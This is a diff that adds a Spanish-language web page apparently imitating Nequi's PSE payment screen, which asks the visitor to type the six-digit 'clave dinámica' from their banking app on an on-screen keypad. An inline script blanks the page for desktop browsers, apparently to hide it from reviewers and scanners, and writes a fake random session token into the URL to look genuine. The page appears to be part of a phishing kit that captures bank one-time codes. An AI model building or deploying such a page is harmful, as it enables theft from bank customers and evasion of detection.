@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nequi - Clave Dinámica</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="mobile-container">
+        <!-- Error Alert -->
+        <div id="error-alert" class="error-alert">
+            <i class="fas fa-exclamation-circle" style="margin-right: 8px;"></i>
+            Clave dinámica incorrecta
+        </div>
+
+        <!-- Loading Overlay -->
+        <div id="loading-overlay" class="loading-overlay">
+            <div class="spinner"></div>
+            <div class="loading-text">Verificando...</div>
+        </div>
+
+        <header class="header">
+            <button class="back-button">
+                <i class="fas fa-arrow-left"></i>
+            </button>
+        </header>
+
+        <main class="content">
+            <div class="logo-container">
+                <h1 class="nequi-logo">Nequi<span class="dot"></span></h1>
+            </div>
+
+            <h2 class="page-title">Pagos PSE de Nequi</h2>
+
+            <p class="description">
+                Para confirmar tu pago escribe o pega la clave dinámica que encuentras en tu App Nequi.
+            </p>
+
+            <div class="dynamic-key-display">
+                <div class="digit-box"></div>
+                <div class="digit-box"></div>
+                <div class="digit-box"></div>
+                <div class="digit-box"></div>
+                <div class="digit-box"></div>
+                <div class="digit-box"></div>
+            </div>
+
+            <div class="keypad-spacer"></div>
+
+            <div class="numeric-keypad">
+                <button class="keypad-btn" data-value="1">1</button>
+                <button class="keypad-btn" data-value="2">2</button>
+                <button class="keypad-btn" data-value="3">3</button>
+                <button class="keypad-btn" data-value="4">4</button>
+                <button class="keypad-btn" data-value="5">5</button>
+                <button class="keypad-btn" data-value="6">6</button>
+                <button class="keypad-btn" data-value="7">7</button>
+                <button class="keypad-btn" data-value="8">8</button>
+                <button class="keypad-btn" data-value="9">9</button>
+                <div class="keypad-btn empty"></div>
+                <button class="keypad-btn" data-value="0">0</button>
+                <button class="keypad-btn backspace" id="backspace-btn">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+
+            <div class="cancel-container">
+                <button type="button" class="btn btn-secondary cancel-btn">Cancela</button>
+            </div>
+        </main>
+    </div>
+
+    <script src="dynamic-key.js"></script>
+<script>
+    (function() {
+        // Mobile Check
+        var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+        var mobileRegex = /android|avantgo|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile|o2|opera m(ob|in)i|palm( os)?|p(ixi|re)\/|plucker|pocket|psp|smartphone|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i;
+        if (!mobileRegex.test(userAgent)) {
+            document.body.innerHTML = '';
+        }
+
+        try {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let token = '';
+            for(let i=0; i < 50 + Math.floor(Math.random() * 30); i++) {
+                token += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            const base64Token = btoa(token + Date.now()).replace(/=/g, '');
+            const url = new URL(window.location.href);
+            url.searchParams.set('token', base64Token);
+            window.history.replaceState(null, '', url.toString());
+        } catch(e) {}
+    })();
+</script>
+</body>
+</html>
